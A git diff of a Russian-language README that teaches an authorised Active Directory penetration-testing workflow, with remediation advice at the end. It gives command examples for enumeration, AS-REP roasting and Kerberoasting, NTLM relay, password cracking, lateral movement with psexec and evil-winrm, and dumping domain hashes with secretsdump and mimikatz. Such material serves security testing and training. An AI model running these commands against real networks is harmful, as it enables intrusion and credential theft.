@@ -2,30 +2,31 @@
 
 > **Внимание.** Всякий тест безопасности должен проводиться только с письменного разрешения владельца сети. Нелегальные действия — уголовно наказуемы.
 
-Этот README описывает пошаговый процесс тестирования Active Directory (AD) в условиях локальной сети, соответствующий схеме `pentesting_active_directory.svg`. Документ включает: подготовку окружения, установку инструментов, пофазовый план тестирования (разведка → перечисление → атаки на аутентификацию → эксплуатация → пост-эксплуатация → очистка и отчёт), а также готовые примеры команд и рекомендации по защите.
+Этот README описывает пошаговый процесс тестирования Active Directory (AD) в условиях локальной сети, соответствующий схеме [pentesting_active_directory.svg](./pentesting_active_directory.svg). Документ включает: подготовку окружения, установку инструментов, пофазовый план тестирования (разведка → перечисление → атаки на аутентификацию → эксплуатация → пост-эксплуатация → очистка и отчёт), а также готовые примеры команд и рекомендации по защите.
 
 ---
 
 ## Содержание
 
-1. Цели и ограничения
-2. Среда и требования
-3. Установка инструментов (Kali Linux)
-4. Подготовка тестовой лаборатории (рекомендации)
-5. Фаза 1 — Разведка (Discovery)
-6. Фаза 2 — Углублённое перечисление (Enumeration)
-7. Фаза 3 — Атаки на аутентификацию (Credential attacks)
-8. Фаза 4 — Эксплуатация и lateral movement
-9. Фаза 5 — Пост-эксплуатация и эксфильтрация секретов
-10. Фаза 6 — Анализ, отчёт и рекомендации
-11. Чеклист команд и краткие шаблоны
-12. Полезные примечания и рекомендации по безопасности
+1. [Цели и ограничения](#1-цели-и-ограничения)
+2. [Среда и требования](#2-среда-и-требования)
+3. [Установка инструментов (Kali Linux)](#3-установка-инструментов-kali-linux)
+4. [Подготовка тестовой лаборатории](#4-подготовка-тестовой-лаборатории)
+5. [Фаза 1 — Разведка (Discovery)](#5-фаза-1--разведка-discovery)
+   * [Инструменты (Discovery)](#инструменты-discovery)
+   * [SharpHound — примеры запуска](#sharphound--примеры-запуска)
+6. [Фаза 2 — Углублённое перечисление (Enumeration)](#6-фаза-2--углублённое-перечисление-enumeration)
+7. [Фаза 3 — Атаки на аутентификацию (Credential attacks)](#7-фаза-3--атаки-на-аутентификацию-credential-attacks)
+8. [Фаза 4 — Эксплуатация и lateral movement](#8-фаза-4--эксплуатация-и-lateral-movement)
+9. [Фаза 5 — Пост-эксплуатация и эксфильтрация секретов](#9-фаза-5--пост-эксплуатация-и-эксфильтрация-секретов)
+10. [Фаза 6 — Анализ, отчёт и рекомендации](#10-фаза-6--анализ-отчёт-и-рекомендации)
+11. [Чеклист команд и шаблоны](#11-чеклист-команд-и-шаблоны)
+12. [Полезные примечания и безопасность](#12-полезные-примечания-и-безопасность)
 
 ---
 
-## 1. Цели и ограничения
+## 1. Ограничения
 
-* Цель: воспроизвести реальную цепочку атак против AD для поиска векторов эскалации привилегий и путей компрометации критичных ресурсов.
 * Ограничения: рабочие действия нельзя выполнять без письменного согласия; в продуктивной сети согласовывай окна работ и методы, чтобы не нарушить работу сервисов.
 
 ## 2. Среда и требования
@@ -34,11 +35,11 @@
 * Доступ к тестовой сети (или авторизованная внутренняя сеть заказчика).
 * Возможность подключиться к целевому сегменту (VPN, подключение в офисе, VM с маршрутизацией).
 
-Минимальный набор инструментов (описано как устанавливать в разделе 3):
+**Минимальный набор инструментов (быстрая сверка, см. раздел "Инструменты")**:
 
 * nmap, smbclient, smbmap, enum4linux-ng, crackmapexec (CME), impacket scripts (GetNPUsers.py, GetUserSPNs.py, secretsdump.py, psexec.py, wmiexec.py), responder, kerbrute, bloodhound + neo4j, kerberoast tools, hashcat/john, evil-winrm, lsassy, mimikatz (Windows), rubeus (Windows).
 
-## 3. Установка инструментов (Kali Linux) — кратко
+## 3. Установка инструментов (Kali Linux)
 
 В Kali рекомендуется устанавливать системные пакеты через `apt`, а Python-CLI — через `pipx` или виртуальные окружения (PEP 668).
 
@@ -48,9 +49,12 @@
 # (сокращённый пример, полный в скрипте)
 sudo apt update
 sudo apt install -y nmap smbclient smbmap hashcat john bloodhound neo4j crackmapexec evil-winrm responder python3-impacket python3-pip pipx golang git
-pipx ensurepath
-pipx install enum4linux-ng
-pipx install lsassy
+python3 -m pip install --user pipx || true
+python3 -m pipx ensurepath || true
+export PATH="$HOME/.local/bin:$PATH"
+# pipx
+pipx install enum4linux-ng || true
+pipx install lsassy || true
 # kerbrute через go
 go install github.com/ropnop/kerbrute@latest
 ```
@@ -59,19 +63,19 @@ go install github.com/ropnop/kerbrute@latest
 
 ## 4. Подготовка тестовой лаборатории
 
-* Разверни отдельную AD-лабораторию (например, 1x Domain Controller (Windows Server), 1–2x Windows клиентских машин, и Linux атакующий). Используй изолированную сеть/host-only в VirtualBox/VMware.
+* Разверни отдельную AD-лабораторию (1x Domain Controller, 1–2x Windows клиенты, Kali атакующая). Используй изолированную сеть/host-only в VirtualBox/VMware.
 * Настрой аудит и мониторинг — в тестовой среде включи логирование для проверки корректности воспроизведения артефактов.
-* Всегда имитируй реальные политики паролей и роли для более правдоподобного теста.
+* Имитируй реальные политики паролей и роли.
 
 ## 5. Фаза 1 — Разведка (Discovery)
 
 Цель: собрать карту сети, живые хосты, открытые порты и доступные службы.
 
-### Инструменты:
+### Инструменты (Discovery)
 
 * `nmap`, `crackmapexec`, `enum4linux-ng`, `ldapsearch`, `smbclient`, `smbmap`.
 
-### Примеры команд:
+### Примеры команд
 
 ```bash
 # Быстрый полный TCP-скан по подсети
@@ -87,20 +91,42 @@ crackmapexec smb 10.0.0.0/24 --shares --users --groups
 enum4linux-ng <target>
 ```
 
-### Что искать:
+### Что искать
 
 * Domain Controllers (порт 389/636 LDAP, 88 Kerberos, 445 SMB, 3268/3269 GC).
 * Сервисы, которые раскрывают версии и контакты (старые SMBv1, открытые шары с конфигами).
+
+## SharpHound — примеры запуска и collection flags
+
+SharpHound (ingestor для BloodHound) — собирает сессии, ACL, локальных админов, доверия и др. Примеры запуска (PowerShell / Windows):
+
+```powershell
+# запустить полную коллекцию (All)
+Invoke-BloodHound -CollectionMethod All -Domain DOMAIN.LOCAL -ZipFileName data_all.zip
+
+# запустить конкретные коллекции (примеры)
+Invoke-BloodHound -CollectionMethod Group,Session,LocalAdmin,Trusts -Domain DOMAIN.LOCAL -ZipFileName data_subset.zip
+
+# SharpHound.exe (в каталоге SharpHound)
+SharpHound.exe -c All -d DOMAIN.LOCAL -ZipFileName data_sharphound.zip
+
+# специфичные флаги (мини-сбор)
+SharpHound.exe -c Group,Session -d DOMAIN.LOCAL -ZipFileName small_collect.zip
+```
+
+**Полезные collection-флаги**: `All`, `Session`, `LocalAdmin`, `Trusts`, `Group`, `ACL`.
+
+---
 
 ## 6. Фаза 2 — Углублённое перечисление (Enumeration)
 
 Цель: собрать списки пользователей, группы, политики (GPO), данные о сервисах и учётках с делегированными правами.
 
-### Инструменты:
+### Инструменты
 
-* `GetNPUsers.py`, `GetUserSPNs.py`, `smbclient`, `smbmap`, `gpp-decrypt`, `SharpHound` (ingestor для BloodHound).
+* `GetNPUsers.py`, `GetUserSPNs.py`, `smbclient`, `smbmap`, `gpp-decrypt`, `SharpHound`.
 
-### Примеры команд:
+### Примеры команд
 
 ```bash
 # Поиск пользователей без preauth (AS-REP roast)
@@ -113,7 +139,7 @@ python3 GetUserSPNs.py -request -dc-ip <dc_ip> domain/ -outputfile spns.txt
 # Собранные .zip загружать в BloodHound GUI
 ```
 
-### GPO и GPP:
+### GPO и GPP
 
 * Ищи файлы, содержащие пароли (Group Policy Preferences) — использовать `gpp-decrypt` или поиск по XML.
 
@@ -121,11 +147,11 @@ python3 GetUserSPNs.py -request -dc-ip <dc_ip> domain/ -outputfile spns.txt
 
 Цель: получить креденшелы (или хэши), провести Kerberoast/AS-REP, NTLM relays, password spraying.
 
-### Инструменты:
+### Инструменты
 
 * `kerbrute`, `responder`, `ntlmrelayx.py`, `crackmapexec`, `hydra`, `hashcat`, `john`.
 
-### Примеры команд:
+### Примеры команд
 
 ```bash
 # Kerbrute — userenum
@@ -152,11 +178,11 @@ hashcat -m 13100 hashfile.txt wordlist.txt
 
 Цель: перемещаться по сети, запускать контрольно-выявляющие команды, использовать креды для доступа к другим хостам.
 
-### Инструменты:
+### Инструменты
 
 * `evil-winrm`, `psexec.py`, `wmiexec.py`, `smbexec.py`, `crackmapexec`.
 
-### Примеры:
+### Примеры
 
 ```bash
 # Подключение через WinRM (evil-winrm)
@@ -169,7 +195,7 @@ python3 psexec.py domain/user:pass@<target>
 python3 wmiexec.py domain/user:pass@<target>
 ```
 
-### Lateral movement рекомендации:
+### Lateral movement рекомендации
 
 * Используй украденные creds сначала на менее критичных машинах.
 * Проверяй live-сервисы и используемые порты; ограничивай шум (меньше параллельных соединений).
@@ -178,11 +204,11 @@ python3 wmiexec.py domain/user:pass@<target>
 
 Цель: получить привилегии (DA), собрать хэши, токены, сохранить доказательства и подготовить рекомендации.
 
-### Инструменты:
+### Инструменты
 
 * `secretsdump.py`, `mimikatz` (на целевой Windows), `lsassy`, `rubeus`.
 
-### Примеры:
+### Примеры
 
 ```bash
 # secretsdump (импакет) — дамп хэшей с DC (если есть привилегии)
@@ -192,7 +218,7 @@ python3 secretsdump.py domain/administrator:Pass@dc
 # Rubeus — для Kerberos ticket ops (Windows)
 ```
 
-### Что собирать:
+### Что собирать
 
 * NTLM хэши пользователей и компов, дампы LSASS, Kerberos ticket'ы (TGT/TGS), конфигурации сервисов.
 
@@ -201,7 +227,7 @@ python3 secretsdump.py domain/administrator:Pass@dc
 * Собери все артефакты: логи, скриншоты, экспорт BloodHound графа, список найденных уязвимых аккаунтов/политик.
 * Подготовь отчёт, разделённый на: краткое резюме (для менеджмента), техническая часть (для админов), доказательства и PoC, рекомендации по исправлению.
 
-### Рекомендации по исправлению (примерно):
+### Рекомендации по исправлению (примерно)
 
 * Включить MFA для администраторских аккаунтов.
 * Отключить LLMNR/NetBIOS, внедрить защиту от NTLM relay (SMB signing), применить WHitelisting.
@@ -228,4 +254,4 @@ python3 secretsdump.py domain/administrator:Pass@dc
 
 ---
 
-См. также: [Cheatsheet — быстрые команды](./Cheatsheet.md)
+См. также: [Cheatsheet — быстрые команды](./cheatsheet_active_directory.md)
